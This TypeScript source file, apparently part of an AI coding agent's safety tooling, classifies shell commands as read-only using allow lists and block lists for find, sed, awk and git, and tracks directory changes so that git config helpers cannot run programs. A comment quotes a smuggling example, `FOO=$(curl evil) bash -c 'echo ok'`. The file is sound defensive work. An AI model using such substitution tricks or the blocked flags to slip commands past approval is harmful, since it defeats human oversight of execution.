/**
 * @license
 * Copyright 2025 Qwen
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * @deprecated Use `isShellCommandReadOnlyAST` from `./shellAstParser.js` instead.
 * This module uses regex + shell-quote for command parsing and has known edge-case
 * limitations. The AST-based replacement provides accurate parsing via tree-sitter-bash.
 */

import { parse } from 'shell-quote';
import fs from 'node:fs';
import path from 'node:path';
import {
  detectCommandSubstitution,
  splitCommandsWithSeparators,
  stripShellWrapper,
} from './shell-utils.js';
import {
  classifyAwkCommandSafety,
  classifySedCommandSafety,
  hasShellBraceExpansion,
} from './shell-safety-rules.js';
import {
  gitConfigMayExecutePrograms,
  type ShellReadOnlyCheckOptions,
} from './git-config-safety.js';

const READ_ONLY_ROOT_COMMANDS = new Set([
  'awk',
  'basename',
  'cat',
  'cd',
  'column',
  'cut',
  'df',
  'dirname',
  'du',
  'echo',
  'find',
  'git',
  'grep',
  'head',
  'ls',
  'printenv',
  'ps',
  'pwd',
  'sed',
  'stat',
  'tail',
  'wc',
  'which',
  'where',
  'whoami',
]);

const BLOCKED_FIND_FLAGS = new Set([
  '-delete',
  '-exec',
  '-execdir',
  '-ok',
  '-okdir',
]);

const BLOCKED_FIND_PREFIXES = ['-fls', '-fprint', '-fprintf'];

const READ_ONLY_GIT_SUBCOMMANDS = new Set([
  'blame',
  'branch',
  'cat-file',
  'diff',
  'grep',
  'log',
  'ls-files',
  'remote',
  'rev-parse',
  'show',
  'status',
  'describe',
]);

const BLOCKED_GIT_REMOTE_ACTIONS = new Set([
  'add',
  'remove',
  'rm',
  'rename',
  'set-branches',
  'set-head',
  'set-url',
  'prune',
  'update',
]);
const GIT_EXTERNAL_HELPER_OPTION =
  /(?:^--(?:ext-diff|filters|show-signature|textconv|open-files-in-pager)(?:=|$)|%G[?GKFPST])/;

const SAFE_SED_OPTION = /^(?:-[nErsuz]|--(?:quiet|silent))$/;

const ENV_ASSIGNMENT_REGEX = /^[A-Za-z_][A-Za-z0-9_]*=/;
const MALFORMED_CONTROL_OPERATOR =
  /(?:^|[({])\s*(?:&&|\|\||\|&|[|;&])|(?:&&|\|\||\|&|[|;&])\s+(?:&&|\|\||\|&|[|;&])|(?!(?:&&|\|\||\|&))[|;&]{2}|[|;&]{3,}|(?:\|&?|&&|\|\|)\s*[)}]*\s*$/;

function containsWriteRedirection(command: string): boolean {
  let inSingleQuotes = false;
  let inDoubleQuotes = false;
  let escapeNext = false;

  for (const char of command) {
    if (escapeNext) {
      escapeNext = false;
      continue;
    }

    if (char === '\\' && !inSingleQuotes) {
      escapeNext = true;
      continue;
    }

    if (char === "'" && !inDoubleQuotes) {
      inSingleQuotes = !inSingleQuotes;
      continue;
    }

    if (char === '"' && !inSingleQuotes) {
      inDoubleQuotes = !inDoubleQuotes;
      continue;
    }

    if (!inSingleQuotes && !inDoubleQuotes && char === '>') {
      return true;
    }
  }

  return false;
}

function normalizeTokens(segment: string): string[] {
  const parsed = parse(segment, (key) => `\0${key}`);
  const tokens: string[] = [];
  for (const token of parsed) {
    if (typeof token === 'string') {
      tokens.push(token);
    } else if ('op' in token && token.op === 'glob') {
      tokens.push(`\0${token.pattern}`);
    }
  }
  return tokens;
}

function skipEnvironmentAssignments(tokens: string[]): {
  root?: string;
  args: string[];
} {
  let index = 0;
  while (index < tokens.length && ENV_ASSIGNMENT_REGEX.test(tokens[index]!)) {
    index++;
  }

  if (index >= tokens.length) {
    return { args: [] };
  }

  return {
    root: tokens[index],
    args: tokens.slice(index + 1),
  };
}

function evaluateFindCommand(tokens: string[]): boolean {
  const [, ...rest] = tokens;
  if (rest.at(-1)?.startsWith('-')) return false;
  for (const token of rest) {
    const lower = token.toLowerCase();
    if (BLOCKED_FIND_FLAGS.has(lower)) {
      return false;
    }
    if (BLOCKED_FIND_PREFIXES.some((prefix) => lower.startsWith(prefix))) {
      return false;
    }
  }
  return true;
}

function evaluateSedCommand(tokens: string[]): boolean {
  const [, ...rest] = tokens;
  for (const token of rest) {
    if (
      ['-i', '-I'].some((prefix) => token.startsWith(prefix)) ||
      token === '--in-place' ||
      token.startsWith('--in-place=') ||
      token === '-f' ||
      token === '--file' ||
      (token.startsWith('-f') && token.length > 2) ||
      token.startsWith('--file=') ||
      (token.startsWith('-') && !SAFE_SED_OPTION.test(token))
    ) {
      return false;
    }
  }

  return classifySedCommandSafety(rest) === 'read-only';
}

function evaluateAwkCommand(tokens: string[]): boolean {
  const [, ...rest] = tokens;
  return classifyAwkCommandSafety(rest) === 'read-only';
}

function evaluateGitRemoteArgs(args: string[]): boolean {
  const action = args.find((arg) => !arg.startsWith('-'))?.toLowerCase();
  if (action && !['show', 'get-url'].includes(action)) return false;
  for (const arg of args) {
    if (BLOCKED_GIT_REMOTE_ACTIONS.has(arg.toLowerCase())) return false;
  }
  return true;
}

function evaluateGitBranchArgs(args: string[]): boolean {
  return args.length === 0 || (args.length === 1 && args[0] === '--list');
}

function evaluateGitCommand(
  tokens: string[],
  checkOptions?: ShellReadOnlyCheckOptions,
): boolean {
  let index = 1;
  while (index < tokens.length && tokens[index]!.startsWith('-')) {
    const flag = tokens[index++]!.toLowerCase();
    if (flag === '--version') return true;
    if (flag === '--help') return tokens.length === 2;
    return false;
  }

  if (index >= tokens.length) {
    return true;
  }

  const subcommand = tokens[index]!.toLowerCase();
  if (!READ_ONLY_GIT_SUBCOMMANDS.has(subcommand)) {
    return false;
  }

  const args = tokens.slice(index + 1);
  const end = args.indexOf('--');
  const options = args.slice(0, end < 0 ? args.length : end);
  if (
    options.some((arg) => GIT_EXTERNAL_HELPER_OPTION.test(arg)) ||
    (subcommand === 'grep' && options.some((arg) => arg.startsWith('-O')))
  )
    return false;
  if (options.some((arg) => /^(?:--help|--version)$/i.test(arg))) return false;

  let allowed: boolean;
  if (subcommand === 'remote') {
    allowed = evaluateGitRemoteArgs(args);
  } else if (subcommand === 'branch') {
    allowed = evaluateGitBranchArgs(args);
  } else if (['blame', 'diff', 'log', 'show'].includes(subcommand)) {
    allowed = !options.some((arg) => /^--output(?:=|$)/.test(arg));
  } else {
    allowed = true;
  }

  // A whitelisted sub-command can still execute programs configured in the
  // repository-local `.git/config` (diff.external, core.fsmonitor, pagers,
  // credential/ssh helpers). Require confirmation when such keys are
  // present, or when the effective directory after an unresolvable `cd` is
  // unknown. See issue #8575.
  return (
    allowed &&
    !checkOptions?.unknownDir &&
    !(checkOptions?.cwd && gitConfigMayExecutePrograms(checkOptions.cwd))
  );
}

function evaluateShellSegment(
  segment: string,
  checkOptions?: ShellReadOnlyCheckOptions,
): boolean {
  if (!segment.trim()) {
    return true;
  }

  // Substitution check BEFORE stripShellWrapper: a leading
  // env-prefix like `FOO=$(curl evil) bash -c 'echo ok'` would have
  // its substitution-bearing env tokens discarded by
  // `stripShellWrapper`, leaving a substitution-free `echo ok` that
  // this fallback would then classify as read-only. Checking the raw
  // segment first keeps the regex-fallback path in lockstep with the
  // AST classifier and the L3 gates added in
  // PR #4386 R6 (cid 3298521039).
  if (detectCommandSubstitution(segment)) {
    return false;
  }

  const stripped = stripShellWrapper(segment);
  if (!stripped) {
    return true;
  }
  if (stripped !== segment.trim()) return false;

  if (detectCommandSubstitution(stripped)) {
    return false;
  }

  if (containsWriteRedirection(stripped)) {
    return false;
  }

  const tokens = normalizeTokens(stripped);
  if (tokens.length === 0) {
    return true;
  }

  const { root, args } = skipEnvironmentAssignments(tokens);
  if (!root) {
    return true;
  }
  if (root !== tokens[0]) return false;

  const normalizedRoot = root.toLowerCase();
  if (root !== normalizedRoot) return false;
  if (
    /^(awk|find|git|sed)$/.test(normalizedRoot) &&
    args.some(
      (arg) => !arg || arg.includes('\0') || hasShellBraceExpansion(arg),
    )
  )
    return false;
  if (!READ_ONLY_ROOT_COMMANDS.has(normalizedRoot)) {
    return false;
  }

  if (normalizedRoot === 'find') {
    return evaluateFindCommand([normalizedRoot, ...args]);
  }

  if (normalizedRoot === 'sed') {
    return evaluateSedCommand([normalizedRoot, ...args]);
  }

  if (normalizedRoot === 'awk') {
    return evaluateAwkCommand([normalizedRoot, ...args]);
  }

  if (normalizedRoot === 'git') {
    return evaluateGitCommand([normalizedRoot, ...args], checkOptions);
  }

  return true;
}

/**
 * Update the tracked execution directory across compound segments. `cd`
 * with a statically resolvable target moves the probe's base directory;
 * anything unresolvable (`cd` alone, `cd -`, flag-only forms, multi-arg
 * forms, expansions, a subshell-wrapped cd) marks the directory as unknown
 * so later git segments are downgraded (#8575). `pushd`/`popd` never reach
 * this function — they are not whitelisted read-only roots, so their
 * segments are rejected before tracking runs.
 */
const CD_COMMAND = /^cd(?:[)\s]|$)/;

function trackDirectoryChange(
  segment: string,
  currentCwd: string | undefined,
): { currentCwd?: string; unknownDir: boolean } {
  const trimmed = segment.trim();
  const wrapped = trimmed.startsWith('(');
  const bare = wrapped ? trimmed.replace(/^\(+\s*/, '') : trimmed;
  if (!CD_COMMAND.test(bare)) {
    // A disguised cd still changes the directory in bash even though the
    // raw text misses the bare-cd regex: quoted or escaped roots (`"cd"`,
    // `'cd'`, `\cd`) are unquoted before command lookup, and a glued
    // input redirection (`cd<file dir`) is a separate token. When the
    // segment parses to a cd root, fail closed so the following git
    // segments are downgraded instead of probed at the pre-cd cwd (#8575).
    const { root } = skipEnvironmentAssignments(normalizeTokens(bare));
    if (root === 'cd' || root === 'pushd' || root === 'popd') {
      return { currentCwd: undefined, unknownDir: true };
    }
    return { currentCwd, unknownDir: false };
  }
  if (wrapped) {
    // cd inside a subshell: its effect on the segments that follow the
    // flattened split cannot be determined — fail closed.
    return { currentCwd: undefined, unknownDir: true };
  }
  const unknown = { currentCwd: undefined, unknownDir: true };
  const tokens = bare.split(/\s+/).slice(1);
  const operands: string[] = [];
  for (const token of tokens) {
    if (token === '-') return unknown; // `cd -` goes to OLDPWD
    if (token.startsWith('-')) continue; // -P/-L/-e/-- are flags, not targets
    operands.push(token);
  }
  // No operand cds to $HOME; more than one is rejected by bash (`cd: too
  // many arguments`) or rewrites $PWD (`cd old new`) — neither resolvable.
  if (operands.length !== 1) return unknown;
  let target = operands[0]!;
  // Mirror the AST classifier: a fully quoted target resolves to its
  // literal content — single quotes are fully literal, and double quotes
  // are literal unless they hold an expansion or escape (#8575).
  if (/^'[^']*'$/.test(target)) {
    target = target.slice(1, -1);
    if (target.startsWith('~')) return unknown;
  } else if (/^"[^"]*"$/.test(target)) {
    const inner = target.slice(1, -1);
    if (/[\\"$`]/.test(inner) || inner.startsWith('~')) return unknown;
    target = inner;
  } else if (target.startsWith('~') || /[$`'"\\*?[\]{}()<>|;&]/.test(target)) {
    return unknown;
  }
  const resolved = path.isAbsolute(target)
    ? target
    : currentCwd
      ? path.resolve(currentCwd, target)
      : undefined;
  if (!resolved) return unknown;
  // bash refuses to enter a missing target or a non-directory and stays
  // put; fail closed regardless — the target can appear before execution.
  try {
    if (!fs.statSync(resolved).isDirectory()) return unknown;
  } catch {
    return unknown;
  }
  return { currentCwd: resolved, unknownDir: false };
}

/**
 * @deprecated Use `isShellCommandReadOnlyAST` from `./shellAstParser.js` instead.
 * This function uses regex + shell-quote for command parsing with known edge-case
 * limitations. The AST-based replacement provides accurate parsing via tree-sitter-bash.
 *
 * @param command - The shell command string to evaluate.
 * @param checkOptions - Optional `cwd` so git commands can be downgraded when
 *   the repository-local config contains program-executing keys (#8575).
 */
export function isShellCommandReadOnly(
  command: string,
  checkOptions?: ShellReadOnlyCheckOptions,
): boolean {
  if (typeof command !== 'string' || !command.trim()) {
    return false;
  }
  if (MALFORMED_CONTROL_OPERATOR.test(command)) return false;
  if (
    /[({;&|]\s*[A-Za-z_][A-Za-z0-9_]*=/.test(command) ||
    /^[A-Za-z_][A-Za-z0-9_]*=.*[;&|]/s.test(command)
  )
    return false;

  const segments = splitCommandsWithSeparators(command);

  let currentCwd = checkOptions?.cwd;
  let unknownDir = checkOptions?.unknownDir === true;
  let dirChanged = false;
  let diverged = false;

  for (let index = 0; index < segments.length; index++) {
    const segment = segments[index]!.command;
    const incoming = index > 0 ? segments[index - 1]!.separator : null;
    // A segment after a non-`&&` operator (`;`, `||`, `|`, newline, `&`)
    // also runs when a preceding cd did not take effect, so the tracked
    // directory no longer applies once one was involved (#8575).
    if (incoming !== null && incoming !== '&&' && dirChanged) {
      diverged = true;
    }
    if (diverged) {
      unknownDir = true;
      currentCwd = undefined;
    }
    const segmentOptions: ShellReadOnlyCheckOptions | undefined = unknownDir
      ? { cwd: undefined, unknownDir: true }
      : currentCwd
        ? { cwd: currentCwd }
        : undefined;
    if (!evaluateShellSegment(segment, segmentOptions)) {
      return false;
    }
    if (diverged) continue;
    // Every pipeline member runs in a subshell — a cd there never moves
    // the directory the following segments execute in (#8575).
    if (incoming === '|' || incoming === '|&') continue;
    // A `&` backgrounds the segment the same way: a cd there runs in a
    // subshell and leaves the tracked directory alone (#8575).
    if (segments[index]!.separator === '&') continue;
    const tracked = trackDirectoryChange(segment, currentCwd);
    if (tracked.unknownDir) {
      unknownDir = true;
      currentCwd = undefined;
      dirChanged = true;
    } else if (
      tracked.currentCwd !== undefined &&
      tracked.currentCwd !== currentCwd
    ) {
      // A cd joined by `||` may be skipped entirely (the preceding
      // segment succeeded), in which case the following segments run in
      // the prior directory — it must be clean too (#8575).
      if (
        incoming === '||' &&
        currentCwd !== undefined &&
        gitConfigMayExecutePrograms(currentCwd)
      ) {
        unknownDir = true;
        currentCwd = undefined;
      } else {
        currentCwd = tracked.currentCwd;
      }
      dirChanged = true;
    }
  }

  return segments.length > 0;
}
